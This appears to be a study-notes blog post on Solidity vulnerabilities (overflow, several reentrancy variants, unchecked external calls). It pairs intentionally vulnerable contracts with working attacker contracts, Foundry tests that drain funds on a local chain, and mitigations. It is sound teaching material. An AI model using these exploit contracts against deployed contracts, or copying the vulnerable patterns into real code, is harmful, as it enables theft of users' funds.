---
date: '2025-09-16T19:10:33+08:00'
title: 'Solidity Vulnerability Summary'
author: ["Zem"]
summary: "Overflow、Reentrancy、Unchecked external call"
tags: ["Solidity", "Foundry", "Vulnerability"]
series: ["学习笔记"]
---

## Integer Overflow

### Principle

在Solidity` 版本<0.8 `并且没有引入` SafeMath `时，就会导致溢出漏洞；

### Examples

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        // @audit 此处会导致溢出，让结果变0
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > lockTime[msg.sender],
            "Lock time not expired"
        );

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

### Test

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma abicoder v2;
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {TimeLock} from "../src/Counter.sol";

contract CounterTest is Test {
    TimeLock public timelock;
    address alice;

    function setUp() public {
        timelock = new TimeLock();
        alice = makeAddr("alice");
        vm.deal(address(alice), 1 ether);
    }

    function test_overflow() public {
        console.log("alice balance:", alice.balance);
        // alice deposit
        vm.startPrank(alice);
        timelock.deposit{value: 1 ether}();
        // try to withdraw
        // 预期会有revert
        vm.expectRevert();
        timelock.withdraw();
        console.log("alice balance after try to withdraw:", alice.balance);
        // exploit
        console.log("alice exploit the contract");
        // lockTime + expNum = 0xff..ff + 1
        uint expNum = type(uint).max + 1 - timelock.lockTime(address(alice));
        timelock.increaseLockTime(expNum);
        console.log("LockTime:", timelock.lockTime(address(alice)));
        timelock.withdraw();
        console.log("alice banlace after exploit:", alice.balance);
        vm.stopPrank();
    }
}
```

### Mitigation

1. 将Solidity版本变成0.8以上，会自动检查是否溢出；

2. 使用SafeMath库；



## Reentrancy

### Principle

当发生调用时，先调用再更改合约中数据，此时容易导致reentrancy；

### Examples

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // @audit 先转账再更新数据，容易导致reentrancy
        (bool send,) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");

        // check if after send still enough to avoid underflow
        if (balances[msg.sender] >= _weiToWithdraw) {
            balances[msg.sender] -= _weiToWithdraw;
        }
    }
}
```

### Test

Exp:

```solidity
contract Exp {
    EtherStore es;
    address owner;

    constructor(address addr, address owner_addr) payable {
        es = EtherStore(addr);
        owner = owner_addr;
        es.deposit{value: 1 ether}();
    }

    function Attack() public payable {
        es.withdrawFunds(1 ether);
    }

    function withdrawETH() public payable {
        (bool success,) = payable(address(owner)).call{value: address(this).balance}("");
        require(success, "send failed");
    }

    receive() external payable {
        // 需要判断一下，不然会revert，导致攻击失败
        if (address(es).balance >= 1 ether) {
            Attack();
        }
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "forge-std/Vm.sol";
import {EtherStore, Exp} from "src/Test.sol";

contract TestTest is Test {
    // Vm vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    EtherStore es;
    Exp exp;
    address attacker;
    address alice;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        alice = makeAddr("alice");
        vm.deal(alice, 3 ether);
        es = new EtherStore();
    }

    function test_reentrancy() public {
        vm.startPrank(alice);
        es.deposit{value: 3 ether}();
        vm.stopPrank();
        vm.startPrank(attacker);
        exp = new Exp{value: 1 ether}(address(es), attacker);
        exp.Attack();
        exp.withdrawETH();
        vm.stopPrank();
        console.log("Attacker:", address(attacker).balance);
        console.log("EtherStore:", address(es).balance);
    }
}

```

### Mitigation

1. 遵循先检查，然后修改数据，最后调用的原则；
2. 使用OpenZeppelin的ReentrancyGuard库；



## ReadOnly Reentrancy

### Principle

攻击者利用` 正在进行中 `的状态变更流程中，回调受害合约的` view `函数，使该合约读取了错误的值，其他合约根据这个值做出决定，从而产生损失；

### Examples

受害者合约有一个状态更改函数` removeLiquidity() `-该函数会先有一次外部交互` transfer `，然后再更改一些重要状态；

` transfer `会触发回调函数，若回调函数中此时去依赖这些重要状态的借贷池中借款，会使用之前的旧值来产生错误结果；

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @notice ERC677 接收方接口
interface IERC677Receiver {
    function onTokenTransfer(address from, uint256 amount, bytes calldata data) external;
}

/// @notice ERC677 Token 实现
// 若调用transferAndCall，会回调接收方的onTokenTransfer函数
contract ERC677Token is ERC20 {
    constructor(string memory name_, string memory symbol_, uint256 initialSupply_) ERC20(name_, symbol_) {
        _mint(msg.sender, initialSupply_ * 10 ** decimals());
    }

    /// @notice ERC677 扩展: 转账并触发接收方的回调
    function transferAndCall(address to, uint256 value, bytes calldata data) external returns (bool) {
        _transfer(msg.sender, to, value);

        if (_isContract(to)) {
            try IERC677Receiver(to).onTokenTransfer(msg.sender, value, data) {
                // 回调成功
            } catch {
                // 如果接收方没有实现 onTokenTransfer, 忽略错误
            }
        }

        return true;
    }

    /// @dev 判断是否是合约地址
    function _isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }
}

// 资金池
contract VulnerablePool {
    IERC20 public token;
    uint256 public totalSupply;
    uint256 public totalUnderlying;

    mapping(address => uint256) public shares;

    constructor(IERC20 _token) {
        token = _token;
    }

    function deposit(uint256 amount) external {
        // @audit-info 这边没有问题，先转再更新状态
        // @audit-info 先存入1000ETH，totalSupply和totalUnderlying此时为1000
        token.transferFrom(msg.sender, address(this), amount);
        shares[msg.sender] += amount;
        totalSupply += amount;
        totalUnderlying += amount;
    }

    function removeLiquidity(uint256 amount) external {
        require(shares[msg.sender] >= amount, "not enough shares");
        // @audit-issue payout = 1000 * 1000 / 1000 = 1
        uint256 payout = (totalUnderlying * amount) / totalSupply;
        // @audit 此处可能会导致只读重入攻击，若在transfer的过程中去调用getVirtualPrice
        // @audit totalUnderlying和totalSupply还是旧值
        bytes memory emptyData = "";
        // 触发 ERC677 回调
        ERC677Token(address(token)).transferAndCall(msg.sender, payout, emptyData);
        // @audit 状态更新在后面
        shares[msg.sender] -= amount;
        totalSupply -= amount;
        totalUnderlying -= payout;
    }

    function getVirtualPrice() public view returns (uint256) {
        if (totalSupply == 0) return 1e18;
        // @audit-issue 恶意：1000 ether / 1000 = 1 ether
        return (totalUnderlying * 1e18) / totalSupply;
    }
}

// 借贷协议
contract Lending {
    VulnerablePool public pool;
    IERC20 public stable;

    mapping(address => uint256) public debt;

    constructor(VulnerablePool _pool, IERC20 _stable) {
        pool = _pool;
        stable = _stable;
    }

    function borrow(uint256 sharesAmount) external {
        // @audit 此处用了Pool的view函数getVirtualPrice，若totalUnderlying和totalSupply还是旧值
        // @audit-issue value = 1000 * 1 / 1 = 1000
        uint256 value = (sharesAmount * pool.getVirtualPrice()) / 1e18;
        // @audit-issue loan = 1000 * 80 / 100 = 800，恶意者不仅可以将自身的资产取出，还能多借800 ether
        uint256 loan = value * 80 / 100;

        debt[msg.sender] += loan;
        stable.transfer(msg.sender, loan);
    }
}
```

### Test

Exp:

```solidity
contract Exp {
    ERC677Token token;
    VulnerablePool pool;
    Lending lending;
    address owner;

    constructor(address token_addr, address pool_addr, address lend_addr) {
        token = ERC677Token(token_addr);
        pool = VulnerablePool(pool_addr);
        lending = Lending(lend_addr);
        owner = msg.sender;
    }

    function Attack() public payable {
        token.approve(address(pool), 1000 ether);
        pool.deposit(1000 ether);
        pool.removeLiquidity(1000 ether);
        token.transfer(owner, token.balanceOf(address(this)));
    }

    // token 回调 / fallback
    function onTokenTransfer(address, uint256, bytes calldata) external {
        // 此时 Pool 还没更新 totalSupply/totalUnderlying // 调用借贷合约，拿到虚高 collateral 估值
        lending.borrow(pool.shares(address(this)));
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
// import "forge-std/Vm.sol";
import {ERC677Token, VulnerablePool, Lending, Exp} from "src/Test.sol";

contract TestTest is Test {
    // Vm vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    ERC677Token token;
    VulnerablePool pool;
    Lending lending;
    Exp exp;
    address attacker;

    function setUp() public {
        token = new ERC677Token("ZEM", "ZEM", 2000);
        pool = new VulnerablePool(token);
        lending = new Lending(pool, token);
        deal(address(token), address(lending), 1000 ether);
        attacker = makeAddr("attacker");
        deal(address(token), address(attacker), 1000 ether);
    }

    function test_read_only_reentrancy() public {
        vm.startPrank(attacker);
        exp = new Exp(address(token), address(pool), address(lending));
        console.log("Attacker token balance before:", token.balanceOf(address(attacker)));
        console.log("Attacker Debt:", lending.debt(address(exp)));
        token.transfer(address(exp), 1000 ether);
        exp.Attack();
        console.log("Attacker token balance after:", token.balanceOf(address(attacker)));
        console.log("Attacker Debt:", lending.debt(address(exp)));
        vm.stopPrank();
    }
}
```

### Mitigation

1. 做任何外部调用前，先修改状态；
2. 使用ReentrancyGuard保护，读取时检查锁状态：` view : require(_status == 0, "locked"); `，` external call : _status = 1; `；

3. 使用受信任的链上预言机（Chainlink 等）；
4. 把定价等逻辑移动到` 只读但基于immutable、constant、或者受限更新 `的来源；



## ERC777 Reentrancy

### Principle

ERC777在ERC20的基础上增加了允许实现` receive hooks `，以便在接收到代币时进行操作：

当代币发送到合约地址时，会对接收方合约调用` tokensReceived() `；

### Examples

所有接收ERC777代币的地址都需要主动登记到` IERC1820Registry `，并且实现` IERC777Recipient `接口，不然会报错；

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// 由于v5已经弃用，所以需要forge install OpenZeppelin/openzeppelin-contracts@v4.9.3 --no-commit
// 再forge remappings > remappings.txt
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import {Test, console} from "forge-std/Test.sol";

contract Token is ERC777 {
    constructor(string memory name_, string memory symbol_, uint256 initialSupply_)
        ERC777(name_, symbol_, new address[](0))
    {}

    function mint(address account, uint256 amount, bytes memory userData, bytes memory operatorData)
        public
        returns (bool)
    {
        _mint(account, amount, userData, operatorData);
        return true;
    }
}

contract VulnerableVault is IERC777Recipient {
    ERC777 public token;
    mapping(address => uint256) public balanceOf;

    constructor(ERC777 _token) {
        token = _token;
        // 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24 是主网/测试网/Foundry 内置的 ERC1820 地址
        // 告诉所有ERC777代币，该地址为ERC777TokensRecipient的实现者，可以转账
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(
            address(this), keccak256("ERC777TokensRecipient"), address(this)
        );
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender] += amount;
    }

    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "insufficient balance");
        // @audit 此处有重入攻击风险，先执行再更改状态
        // transfer:会触发接收方的tokensReceived函数，没有实现则不触发
        token.transfer(msg.sender, amount);
        // 防止下溢
        if (balanceOf[msg.sender] >= amount) {
            balanceOf[msg.sender] -= amount;
        }
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {}
}
```

### Test

Exp：

```solidity
contract Exp is IERC777Recipient {
    VulnerableVault public vault;
    ERC777 public token;
    address owner;

    constructor(address vault_, address token_) {
        vault = VulnerableVault(vault_);
        token = Token(token_);
        owner = msg.sender;
        // 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24 是主网/测试网/Foundry 内置的 ERC1820 地址
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(
            address(this), keccak256("ERC777TokensRecipient"), address(this)
        );
    }

    function Attack() public {
        token.approve(address(vault), 1000 ether);
        vault.deposit(1000 ether);
        vault.withdraw(1000 ether);
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        console.log("callback, msg.sender:", msg.sender);
        if (token.balanceOf(address(vault)) >= 1000 ether && vault.balanceOf(address(this)) != 0) {
            vault.withdraw(1000 ether);
        }
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
// import "forge-std/Vm.sol";

import {Token, VulnerableVault, Exp} from "src/Test.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";

contract TestTest is Test {
    // Vm vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    Token token;
    VulnerableVault vault;
    Exp exp;
    address attacker;

    function setUp() public {
        // 由于foundry本地链上没有部署真正的 ERC1820 合约，手动在该地址制造ERC1820 注册表合约
        vm.etch(
            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),
            bytes(
                hex"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029"
            )
        );
        address[] memory defaultOperators = new address[](1);
        defaultOperators[0] = address(this);
        token = new Token("ZEM", "ZEM", 0);
        vault = new VulnerableVault(token);
        attacker = makeAddr("attacker");
        token.mint(address(vault), 1000 ether, "", "");
        vm.prank(attacker);
        exp = new Exp(address(vault), address(token));
        token.mint(address(exp), 1000 ether, "", "");
    }

    function test_erc777_reentrancy() public {
        vm.startPrank(attacker);
        exp.Attack();
        vm.stopPrank();
        console.log("Exp Balance:", token.balanceOf(address(exp)));
    }
}

```

### Mitigation

1. **遵循 CEI（Check-Effects-Interactions）**：任何外部调用（包括 `transfer`）都应发生在**修改合约内部状态之后**；
2. **使用重入锁（ReentrancyGuard）**：用 OpenZeppelin 的 `nonReentrant` 修饰器保护 `withdraw` 等敏感函数；
3. 要考虑token会回调的风险；



## ERC721 Reentrancy

### Principle

ERC721有一个` safeTransferFrom `，其实现会在接收地址是合约时调用 `onERC721Received` 回调（ERC721Receiver）；

如果合约/库在调用 `onERC721Received` 之前没更新好所有关键状态，就会被恶意接收者利用回调再调用原合约其它方法，触发重入。

一些常见的攻击面：` safeTransferFrom `、` safeMint `、` _beforeTokenTransfer/_afterTokenTransfer `；

交易市场拍卖NFT的处理顺序不当时（先转NFT给买家再更新清单状态等）；

### Examples

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract NFTToken is ERC721 {
    uint256 public nextTokenId = 1;
    uint256 public maxSupply = 100;

    constructor(string memory name_, string memory symbol_) ERC721(name_, symbol_) {}

    function mint(address to) public {
        require(nextTokenId <= maxSupply, "ERC721: max supply reached");
        _mint(to, nextTokenId);
        nextTokenId += 1;
    }
}

contract VulnerableMarket {
    struct Listing {
        address seller;
        address nft;
        uint256 tokenId;
        uint256 price;
    }

    mapping(uint256 => Listing) public listings;

    function list(uint256 id, address nft, uint256 tokenId, uint256 price) external {
        listings[id] = Listing(msg.sender, nft, tokenId, price);
    }

    function buy(uint256 id) external payable {
        Listing memory l = listings[id];
        require(msg.value == l.price, "wrong price");
        // @audit 先转NFT再清除数据，有重入攻击风险
        IERC721(l.nft).safeTransferFrom(l.seller, msg.sender, l.tokenId);
        (bool ok,) = l.seller.call{value: msg.value}("");
        require(ok);

        delete listings[id];
    }
}
```

### Mitigation

1. **遵循 CEI（Check-Effects-Interactions）**：任何外部调用（包括 `safeTransferFrom`）都应发生在**修改合约内部状态之后**；
2. **谨慎使用 `_beforeTokenTransfer` / `_afterTokenTransfer`**：避免在钩子里做需要外部安全保证的逻辑，或避免在钩子里做任意外部调用。如果必须，确保钩子里的状态变更顺序安全
3. **使用重入锁（ReentrancyGuard）**：用 OpenZeppelin 的 `nonReentrant` 修饰器保护敏感函数；
4. 不要主动把资金 `call` 到外部地址，改为记录应付金额，让接收者主动 `withdraw()`。这样即使有重入，攻击面小；



## Unchecked external call

### Principle

如果未对低级别的外部调用进行检查，可能会导致意外的行为（再结合其他漏洞）；

### Examples

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract TokenWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000; // 1 mil
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }

    // Approves and then calls the contract code
    function approveAndCallcode(address _spender, uint256 _value, bytes memory _extraData) public {
        allowance[msg.sender][_spender] = _value;

        bool success;
        // @audit 由于未检查calldata，可以随意被攻击者调用
        (success,) = _spender.call(_extraData);
        require(success);
    }
}
```

### Test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
// import "forge-std/Vm.sol";
import {TokenWhale} from "src/Test.sol";

contract TestTest is Test {
    // Vm vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    TokenWhale tw;
    address attacker;

    function setUp() public {
        tw = new TokenWhale();
        tw.TokenWhaleDeploy(address(tw));
    }

    function test_unchecked_external_call() public {
        vm.prank(attacker);
        tw.approveAndCallcode(
            address(tw),
            tw.balanceOf(address(tw)),
            abi.encodeWithSignature("transfer(address,uint256)", attacker, tw.balanceOf(address(tw)))
        );
        console.log("Attacker Balance:", tw.balanceOf(attacker));
    }
}
```

### Mitigation

避免使用低级别的调用，或者检查calldata中的内容，使其只允许白名单内的call调用；

